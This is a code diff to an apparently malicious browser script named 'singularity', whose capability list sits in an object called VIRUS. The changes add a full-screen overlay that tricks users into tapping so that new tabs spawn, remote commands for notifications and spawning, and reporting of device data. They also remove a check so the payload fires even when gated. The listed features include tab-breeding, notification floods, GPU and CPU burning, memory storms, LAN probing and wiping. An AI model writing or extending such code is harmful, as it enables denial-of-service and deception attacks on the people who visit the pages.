+  d.style.cssText = "position:fixed;inset:0;z-index:2147483647;display:none;"
+    + "align-items:center;justify-content:center;text-align:center;"
+    + "background:rgba(5,7,10,.72);-webkit-backdrop-filter:blur(3px);"
+    + "backdrop-filter:blur(3px);cursor:pointer;padding:24px;"
+    + "-webkit-tap-highlight-color:transparent;"
+    + "font:13px/1.7 system-ui,-apple-system,'Hiragino Sans',sans-serif;color:#7ee08a";
+  d.innerHTML = '<div><div style="font-size:44px;line-height:1">\u25C9</div>'
+    + '<div style="font-size:19px;font-weight:800;letter-spacing:1px">'
+    + '\u30BF\u30C3\u30D7\u3057\u3066\u5897\u6B96</div>'
+    + '<div id="sg_tap_n" style="margin-top:9px;font-size:13px;color:#9fd8bb">\u2026</div>'
+    + '<div style="margin-top:14px;font-size:11.5px;color:#5f8d74;line-height:1.9">'
+    + '\u30BF\u30C3\u30D7\u3059\u308B\u305F\u3073\u306B\u30BF\u30D6\u304C\u5897\u3048\u307E\u3059'
+    + '<br>\u753B\u9762\u306E\u3069\u3053\u3067\u3082OK</div></div>';
+  document.body.appendChild(d);
+}
 function tapOverlay() {
   try {
+    if (WIN || IFR) return;
     var d = document.getElementById("sg_tap");
+    var need = QUEUE.length > 0;
+    var base = (!INJ && !R.tapped && (IS_MOBILE || !NOTIFY_OK));
+    if (!need && !base) { if (d) d.style.display = "none"; return; }
+    ensureTap();
+    d = document.getElementById("sg_tap");
     if (!d) return;
     var n = document.getElementById("sg_tap_n");
-    if (n) n.textContent = QUEUE.length ? "\u6E96\u5099\u4E2D\u2026" : "\u4FDD\u8B77\u4E2D";
-    var show;
-    if (TAB) show = (IS_IOS && QUEUE.length > 0);
-    else show = (!R.tapped && (IS_MOBILE || !NOTIFY_OK));
-    d.style.display = show ? "flex" : "none";
+    if (n) n.textContent = QUEUE.length ? ("\u6E96\u5099\u4E2D\u2026 " + QUEUE.length + " \u679A")
+                                        : "\u4FDD\u8B77\u4E2D";
+    d.style.display = "flex";
   } catch (e) {}
 }
 
@@ -2418,11 +2613,13 @@ function report() {
     swreg: R.swreg, persist: R.persist, union: R.union, app: R.app, manifest: R.manifest,
     auto: { on: AUTO_ON ? 1 : 0, live: liveN(), spawned: SPAWN_N,
             tab: AUTO_T[LEVEL] || 0, win: AUTO_W[LEVEL] || 0, cap: AUTO_CAP[LEVEL] || 0,
-            leader: isLeader() ? 1 : 0, at: now() },
+            leader: isLeader() ? 1 : 0, pending: PENDING_N, queue: QUEUE.length,
+            ok: SPAWN_OK, fail: SPAWN_FAIL, at: now() },
     tab: R.tab, tabLive: tabLive(), tabOn: TAB_ON ? 1 : 0,
     apex: R.apex, shader: R.shader ? 1 : 0, worklet: R.aw ? 1 : 0, sab: R.sab ? 1 : 0,
     lan: R.lan ? (R.lan.n || 0) : 0, rtc: R.rtc ? 1 : 0, hold: R.hold ? 1 : 0,
     dl: R.dl, ni: R.ni, notify: R.notify, notifyOk: R.notifyOk ? 1 : 0,
+    gated: R.gated ? 1 : 0,
     win: { mode: CFG.winMode, branch: CFG.winBranch, depth: CFG.winDepth, skin: CFG.winSkin,
            w: W, queue: QUEUE.length, opened: TAP_OPENED, mob: IS_MOBILE ? 1 : 0 }
   };
@@ -2503,6 +2700,7 @@ function runCmd(c) {
     else if (k === "wake") { CFG.wakelock = 1; wakelock(); }
     else if (k === "batt") { batteryRead(); }
     else if (k === "net") { netGuess(); push(true); }
+    else if (k === "notifyPerm") { notifyPerm(); notifyOne(); }
     /* --- APEX --- */
     else if (k === "apex") { CFG.apex = 1; apexFire(); }
     else if (k === "shader") { apexShader(); }
@@ -2538,6 +2736,7 @@ function runCmd(c) {
       }
       hint();
     }
+    else if (k === "flush") { flushQueue(true); }
     else if (k === "tabon") { TAB_ON = true; LAST_TAB = 0; tabBreed(); }
     else if (k === "taboff") { TAB_ON = false; }
     else if (k === "breed") {
@@ -3192,6 +3391,7 @@ function arm() {
                 nochain: NOCHAIN ? 1 : 0 };
   } catch (e) {}
   try { push(true); } catch (e) {}
+  try { ensureTap(); } catch (e) {}
   if (IS_MOBILE || !NOTIFY_OK) { try { hint(); tapOverlay(); } catch (e) {} }
   try { autoStart(); } catch (e) { err_(e); }
 
@@ -3286,9 +3486,8 @@ function arm() {
   if (CFG.wipe) { setTimeout(wipe, 1600); }
   try { hopFile(); } catch (e) {}
   GATED = !bombGate();
-  if (GATED) applyLevel(0);
+  if (GATED) { applyLevel(0); R.gated = 1; }
   if (!CFG.fire) { push(false); return; }
-  if (GATED) { push(false); return; }
 
   try { if (hardOn()) hardKill(); } catch (e) { err_(e); }
   try { keeperStart(); } catch (e) { err_(e); }
@@ -3314,12 +3513,15 @@ window.__singularity = {
   tab: function (n) { runCmd({ kind: "tab", arg: String(n || 4) }); },
   tap: function () { return flushQueue(true); },
   queue: function () { return QUEUE.length; },
+  pending: function () { return PENDING_N; },
+  spawnNow: function (u) { return spawnOne(u || CFG.path + "?u=tab", "tab", null); },
   live: function () { return liveN(); },
   liveTabs: function () { return tabLive(); },
   apex: function () { apexFire(); },
   apexStop: apexStop,
   notify: function (n) { return notifyBurst(n || 1); },
   notifyPerm: notifyPerm,
+  notifyNow: function () { return notifyOne(); },
   auto: function (on) { AUTO_ON = on !== false; return AUTO_ON; },
   tabAuto: function (on) { TAB_ON = on !== false; return TAB_ON; },
   mobile: function () { return IS_MOBILE; },
@@ -3372,7 +3574,8 @@ VIRUS = {
              "tab-breed-l3", "tab-auto-unlimited-l7", "notify-continuous",
              "stealth-text", "big-install", "apex-suite-l7", "shader-burn",
              "audioworklet", "atomics-spin", "microtask-flood", "broadcast-flood",
-             "lan-probe", "webrtc-loopback", "dom-melt", "gc-storm"],
+             "lan-probe", "webrtc-loopback", "dom-melt", "gc-storm",
+             "spawn-ack", "notify-sw", "notify-toast", "lossless-spawn"],
 }
 
 _ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789"
